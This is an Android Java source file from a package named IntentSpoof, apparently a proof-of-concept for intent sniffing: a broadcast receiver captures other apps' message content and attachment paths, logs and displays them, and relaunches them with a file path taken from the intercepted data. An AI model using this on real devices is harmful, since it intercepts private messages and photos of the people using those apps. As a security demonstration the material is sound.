package com.example.jegri.IntentSpoof;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import java.io.File;

/**
 * Created by kmluns on 23.06.2017.
 */

public class ReceiverExported extends BroadcastReceiver
{
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(intent);

        Intent i2 = new Intent(context,Main2Activity.class);
        i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i2.setAction(android.content.Intent.ACTION_VIEW);
        i2.putExtra("content",intent.getStringExtra("content"));

        if(intent.getStringExtra("attachment_path") != null){

            Log.d("attachment_path : ",intent.getStringExtra("attachment_path") ) ;
            Toast.makeText(context,intent.getStringExtra("attachment_path"), Toast.LENGTH_SHORT).show();

            /* Change PhonoUrl */
            String photoUrl = /* "Url photoUrl on Phone Example : /storage/emulated/0/Android/data/photo" + */  intent.getStringExtra("content");

            File videoFile2Play = new File(photoUrl);
            i2.putExtra("attachment_path", Uri.fromFile(videoFile2Play));

            Log.d("app : " , "Intent Sniffing with Exported on Photo!!!");
            Toast.makeText(context, "Intent Sniffing with Exported on Photo!!!", Toast.LENGTH_SHORT).show();

            Log.d("content : ",intent.getStringExtra("content") ) ;
            Toast.makeText(context,intent.getStringExtra("content"), Toast.LENGTH_SHORT).show();

        }else{
            Log.d("app : " , "Intent Sniffing with Exported on QuickMessage!!!");
            Toast.makeText(context, "Intent Sniffing with Exported on QuickMessage!!!", Toast.LENGTH_SHORT).show();

            Log.d("content : ",intent.getStringExtra("content") ) ;
            Toast.makeText(context,intent.getStringExtra("content"), Toast.LENGTH_SHORT).show();
        }

        context.startActivity(i2);
    }
}
